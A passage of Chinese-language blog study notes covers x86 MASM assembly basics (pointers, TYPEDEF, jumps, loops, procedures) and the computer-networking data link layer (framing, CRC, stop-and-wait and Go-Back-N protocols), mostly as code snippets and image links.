class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">  array_b BYTE 10h, 20h, 30h, 40h</span><br><span class="line">  array_w WORD 1000h, 2000h, 3000h</span><br><span class="line">  ptr_b DWORD array_b</span><br><span class="line">  ptr_w DWORD array_w</span><br><span class="line">  </span><br><span class="line">;另一种方式</span><br><span class="line">.data</span><br><span class="line">  array_b BYTE 10h, 20h, 30h, 40h</span><br><span class="line">  array_w WORD 1000h, 2000h, 3000h</span><br><span class="line">  ptr_b DWORD OFFSET array_b</span><br><span class="line">  ptr_w DWORD OFFSET array_w</span><br></pre></td></tr></table></figure><p><strong>TYPEDEF</strong></p><p>TYPEDEF操作符允许创建用户自定义的类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PBYTE TYPEDEF PTR BYTE ;字节指针</span><br><span class="line">PWORD TYPEDEF PTR WORD ;字指针</span><br><span class="line">PDWORD TYPEDEF PTR DWORD ;双字指针</span><br><span class="line">.data</span><br><span class="line">array1 DWORD 1000h, 2000h, 3000h, 4000h</span><br><span class="line">ptr1 PDWORD array1</span><br></pre></td></tr></table></figure><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><h2 id="JMP和LOOP指令"><a href="#JMP和LOOP指令" class="headerlink" title="JMP和LOOP指令"></a>JMP和LOOP指令</h2><p><strong>控制转移</strong></p><p>控制转移（transfer of control）是一种改变汇编语句执行顺序的方法。</p><ul><li>无条件转移</li><li>条件转移</li></ul><p><strong>无条件转移</strong></p><p>将CPU控制权直接转移到指定的汇编语句</p><ul><li>修改EIP为指定的内存地址</li><li>CPU从EIP指定的内存地址读取下一条机器指令</li></ul><p><strong>JMP指令</strong></p><ul><li>JMP 目的地址</li><li>JMP指令实现CPU控制权的无条件跳转</li><li>目的地址是代码标号<ul><li>代码标号被汇编器翻译成内存地址</li><li>CPU看到的是内存地址，不是代码标号</li></ul></li></ul><p><strong>CMP指令</strong></p><p>比较目的操作数和源操作数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CMP reg, reg</span><br><span class="line">CMP reg, imm</span><br><span class="line">CMP mem, reg</span><br><span class="line">CMP mem, imm</span><br><span class="line">CMP reg, mem</span><br></pre></td></tr></table></figure><ul><li>执行<strong>从源操作数中减掉目的操作数</strong>的减法操作</li><li>设置相应的标志位，不改变操作数（不保存减法结果）</li><li>标志位：OF、SF、ZF、AF、PF、CF</li></ul><p><strong>条件转移指令</strong></p><ul><li>JA</li><li>JB</li><li>JE</li><li>JNE</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  MOV EAX，100h</span><br><span class="line">  MOV EBX, 200h</span><br><span class="line">  CMP EAX, EBX</span><br><span class="line">  JA L1</span><br><span class="line">  INVOKE StdOut， ADDR str1</span><br><span class="line">  JMP L2</span><br><span class="line">L1：</span><br><span class="line">  INVOKE StdOut，ADDR str2</span><br><span class="line">L2：</span><br><span class="line">  INVOKE ExitProcess，0</span><br></pre></td></tr></table></figure><p><strong>LOOP指令</strong></p><ul><li>LOOP 目的地址</li><li>LOOP指令可以指定循环执行的次数<ul><li>ECX寄存器作为循环寄存器</li><li>LOOP指令执行时，ECX减一</li><li>如果ECX不等于0，跳转到目的地址</li><li>如果ECX等于0，不跳转，顺序执行</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  MOV EAX 10h</span><br><span class="line">  MOV ECX 10h</span><br><span class="line">L1：</span><br><span class="line">  INC EAX</span><br><span class="line">  LOOP L1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">;循环的嵌套</span><br><span class="line">.data</span><br><span class="line">  count DWORD 0</span><br><span class="line">.code</span><br><span class="line">  MOV ECX, 100； L1 循环100次</span><br><span class="line">L1：</span><br><span class="line">  MOV count, ECX</span><br><span class="line">  MOV ECX, 10 ; L2 循环10次</span><br><span class="line">L2:</span><br><span class="line">  ... ....</span><br><span class="line">  LOOP L2</span><br><span class="line">  MOV ECX， count</span><br><span class="line">  LOOP L1</span><br><span class="line">  </span><br><span class="line">;数组求和</span><br><span class="line">.data</span><br><span class="line">  array DWORD 100h, 200h, 300h, 400h</span><br><span class="line">.code</span><br><span class="line">  MOV ECX, LENGTHOF array ; 循环次数</span><br><span class="line">  MOV EDI，OFFSET array</span><br><span class="line">  MOV EAX，0</span><br><span class="line">L1：</span><br><span class="line">  ADD EAX，[EDI]</span><br><span class="line">  ADD EDI, TYPE array</span><br><span class="line">  LOOP L1</span><br><span class="line">  </span><br><span class="line">;字符串赋值</span><br><span class="line">.data</span><br><span class="line">  src BYTE “Hello World”, 0Dh, 0Ah, 0</span><br><span class="line">  dst BYTE SIZEOF src DUP(0), 0</span><br><span class="line">.code</span><br><span class="line">  MOV ECX, SIZEOF src</span><br><span class="line">  MOV ESI, 0</span><br><span class="line">L1:</span><br><span class="line">  MOV AL, BYTE PTR src[ESI]</span><br><span class="line">  MOV BYTE PTR dst[ESI], AL</span><br><span class="line">  INC ESI</span><br><span class="line">  LOOP L1</span><br><span class="line">  </span><br><span class="line">.data</span><br><span class="line">  num BYTE 1， 2， 3， 4， 5， 6， 7， 8， 9， 0</span><br><span class="line">.code</span><br><span class="line">  MOV ECX, 10</span><br><span class="line">  MOV ESI, 0</span><br><span class="line">L1:</span><br><span class="line">  MOV AL, BYTE PTR num[ESI]</span><br><span class="line">  ADD AL，30h</span><br><span class="line">  MOV BYTE PTR num[ESI], AL</span><br><span class="line">  INC ESI</span><br><span class="line">  LOOP L1</span><br></pre></td></tr></table></figure><h2 id="过程的定义和使用"><a href="#过程的定义和使用" class="headerlink" title="过程的定义和使用"></a>过程的定义和使用</h2><p><strong>过程</strong></p><p>汇编语言把过程定义为以返回语句结束的命名语句块。</p><ul><li>使用PROC和ENDP伪指令来声明过程</li><li>必须定义一个过程名字（标识符）</li><li>除启动过程之外，其它过程以ret指令结束<ul><li>将CPU控制权转移到过程被调用的地方</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">my_proc PROC</span><br><span class="line">  ... ...</span><br><span class="line">  ret</span><br><span class="line">my_proc ENDP</span><br></pre></td></tr></table></figure><p><strong>启动过程(main)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">main PROC</span><br><span class="line">  ... ...</span><br><span class="line">main ENDP</span><br></pre></td></tr></table></figure><ul><li>启动过程（main）的返回语句是<ul><li>INVOKE ExitProcess, 0</li><li>将CPU的控制权转移给Windows操作系统</li></ul></li></ul><p><strong>过程的定义</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;计算寄存器EAX、EBX、ECX之和</span><br><span class="line">MyProc PROC</span><br><span class="line">  ADD EAX，EBX</span><br><span class="line">  ADD EAX，ECX</span><br><span class="line">  RET</span><br><span class="line">MyProc ENDP</span><br></pre></td></tr></table></figure><p><strong>过程的调用与返回</strong></p><ul><li><strong>CALL</strong>指令将CPU的控制权转移到新的内存地址执行指令，实现过程的调用</li><li><strong>RET</strong>指令将CPU的控制权返回到程序中过程被调用的地方继续执行</li><li>过程返回地址的保存<ul><li>CALL指令调用之后，将过程的返回地址压入堆栈，将过程入口地址赋值<br>给EIP，实现CPU控制权的转移</li><li>RET指令调用之后，将过程的返回地址赋值给EIP寄存器，实现CPU控制<br>权的转移</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">main PROC</span><br><span class="line">  MOV EAX, 1000h</span><br><span class="line">  MOV EBX, 1000h</span><br><span class="line">  MOV ECX, 1000h</span><br><span class="line">  CALL MyProc</span><br><span class="line">  INVOKE ExitProcess, 0</span><br><span class="line">main ENDP</span><br><span class="line">MyProc PROC</span><br><span class="line">  ADD EAX, EBX</span><br><span class="line">  ADD EAX, ECX</span><br><span class="line">  RET</span><br><span class="line">MyProc ENDP</span><br></pre></td></tr></table></figure><h2 id="调用链接库中的函数"><a href="#调用链接库中的函数" class="headerlink" title="调用链接库中的函数"></a>调用链接库中的函数</h2><p><strong>PROTO伪指令</strong></p><ul><li>PROTO伪指令用于声明链接库中的过程</li><li>StdOut        PROTO :DWORD</li><li>StdIn     PROTO :DWORD, :DWORD</li><li>ExitProcess PROTO STDCALL :DWORD</li></ul>]]></content>
      
      
      <categories>
          
          <category> 汇编语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据链路层</title>
      <link href="/2023/01/05/shu-ju-lian-lu-ceng/"/>
      <url>/2023/01/05/shu-ju-lian-lu-ceng/</url>
      
        <content type="html"><![CDATA[<p><strong>数据链路层定义了在单个链路上如何传输数据。</strong></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005094339248.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005094339248.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005094430569.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005094430569.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>点对点信道和广播信道</strong></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005094915294.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005094915294.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>局域网属于数据链路层。</strong>网络层研究的是一个分组怎么从一个网络，通过路由器，转发到另一个网络。</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005095022268.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005095022268.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>数据链路层传送的协议数据单元是帧(frame)</p><p><strong>点对点信道</strong>的数据链路层面临的三个问题：</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005095235262.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005095235262.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005095307107.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005095307107.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005095332693.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005095332693.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005095418487.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005095418487.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>如果使用的是<strong>广播信道</strong></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005095818505.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005095818505.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005095846100.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005095846100.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005095923993.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005095923993.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005100824278.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005100824278.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="封装成帧"><a href="#封装成帧" class="headerlink" title="封装成帧"></a>封装成帧</h2><p>封装成帧是指数据链路层给上层交付的协议数据单元添加帧头和帧尾使之成为帧。</p><p>帧头和帧尾中包含有重要的<strong>控制信息</strong></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005101106425.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005101106425.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005101211522.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005101211522.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>但并不是每一种数据链路层协议的帧都包含有<strong>帧定界标志</strong></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005101358655.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005101358655.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005101445886.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005101445886.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005101649681.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005101649681.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005101510234.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005101510234.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="透明传输"><a href="#透明传输" class="headerlink" title="透明传输"></a>透明传输</h2><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005101838358.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005101838358.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>所以数据链路层应该对上层交付的数据有限制，其<strong>内容不能包含帧定界符的值</strong></p><p>面向字节的物理链路解决透明传输的问题：使用转义字符”ESC“</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005102116575-16794137540281.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005102116575-16794137540281.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>面向比特的物理链路使用<strong>比特填充</strong>的方法实现透明传输</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005102412185.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005102412185.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>帧的数据部分的长度上限：最大传送单元<strong>MTU</strong></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005102210691.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005102210691.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="差错检测"><a href="#差错检测" class="headerlink" title="差错检测"></a>差错检测</h2><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005103152517.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005103152517.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="奇偶校验"><a href="#奇偶校验" class="headerlink" title="奇偶校验"></a>奇偶校验</h3><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005103526084.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005103526084.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="循环冗余校验CRC-Cyclic-Redundancy-Check"><a href="#循环冗余校验CRC-Cyclic-Redundancy-Check" class="headerlink" title="循环冗余校验CRC(Cyclic Redundancy Check)"></a>循环冗余校验CRC(Cyclic Redundancy Check)</h3><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005103930090.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005103930090.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005103957351.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005103957351.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005104118319.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005104118319.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005104135120.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005104135120.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>循环冗余校验 CRC 是一种检错方法，而帧校验序列 FCS 是添加在数据后面的冗余码</p><p>小结：</p><ol><li>检错码只能检测出帧在传输过程中出现了差错，但并不能定位错误，因此无法纠正错误。</li><li>要想纠正传输中的差错，可以使用冗余信息更多的纠错码进行前向纠错。但纠错码的开销比较大，在计算机网络中较少使用。</li><li>循环冗余校验CRC有很好的检错能力（漏检率非常低），虽然计算比较复杂，但非常易于用<strong>硬件</strong>实现，因此被广泛应用于数据链路层。</li><li>在计算机网络中通常采用我们后续课程中将要讨论的<strong>检错重传方式</strong>来纠正传输中的差错或者仅仅是<strong>丢弃检测到差错的帧</strong>，这取决于数据链路层向其上层提供的是可靠传输服务还是不可靠传输服务。</li></ol><h2 id="可靠传输"><a href="#可靠传输" class="headerlink" title="可靠传输"></a>可靠传输</h2><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005171910622.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005171910622.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005171936869.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005171936869.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>三种可靠协议</p><ul><li><p>停止-等待协议SW</p></li><li><p>回退N帧协议GBN</p></li><li><p>选择重传协议SR</p></li></ul><blockquote><p>这三种可靠传输实现机制的基本原理并不仅限于数据链路层，可以应用到计算机网络体系结构的各层协议中</p></blockquote><h3 id="停止-等待协议"><a href="#停止-等待协议" class="headerlink" title="停止-等待协议"></a>停止-等待协议</h3><p>可能遇到的四个问题：</p><p>误码：丢弃，发送NAK分组</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005172254679.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005172254679.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005172328436.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005172328436.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005172350579.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005172350579.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>数据分组需要编号，确认分组也需要编号</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005172543336.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005172543336.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005172853643.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005172853643.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>停止等待分组的信道利用率</strong></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005173122292.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005173122292.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005173207363.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005173207363.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005173251204.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005173251204.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><blockquote><p>像停止-等待协议这样通过确认和重传机制实现的可靠传输协议，常称为**自动请求重传协议ARQ(Automatic Repeat reQuest)**，意思是重传的请求是自动进行，因为不需要接收方显式地请求，发送方重传某个发送的分组。</p></blockquote><h3 id="回退N帧协议GBN"><a href="#回退N帧协议GBN" class="headerlink" title="回退N帧协议GBN"></a>回退N帧协议GBN</h3><p>在相同的时间内，使用停止-等待协议的发送方只能发送一个数据分组，而采用流水线传输的发送方，可以发送多个数据分组。</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>回退N帧协议在<strong>流水线传输</strong>的基础上，利用<strong>发送窗口</strong>来限制发送方可连续发送数据分组的个数。</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-16794138135203.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-16794138135203.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>无差错情况流程：</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414565766218.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-1679414565766218.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>他们经过互联网传输正确到达接收方，就是没有乱序和误码，接收方按序接收它们，每接收一个，接收窗口就向前滑动一个位置，并给发送方发送针对所接收分组的确认分组，在通过互联网的传输正确到达了发送方。</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-16794138197765.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-16794138197765.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><strong>发送方每接收一个、发送窗口就向前滑动一个位置，这样就有新的序号落入发送窗口</strong>，发送方可以将收到确认的数据分组从缓存中删除了，而接收方可以择机将已接收的数据分组交付上层处理</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-16794138255687.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-16794138255687.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>累计确认</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-16794138277899.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-16794138277899.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005174230835.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005174230835.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>当出现差错时：</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005174416284.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005174416284.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005174430557.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005174430557.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005174514104.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005174514104.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005174543755.png" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/image-20221005174543755.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>若<strong>WT超过取值范围</strong>，例如WT=8，会出现什么情况？</p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941384732611.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941384732611.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941385018513.webp" class="lazyload placeholder" data-srcset="/2023/01/05/shu-ju-lian-lu-ceng/webp-167941385018513.webp" 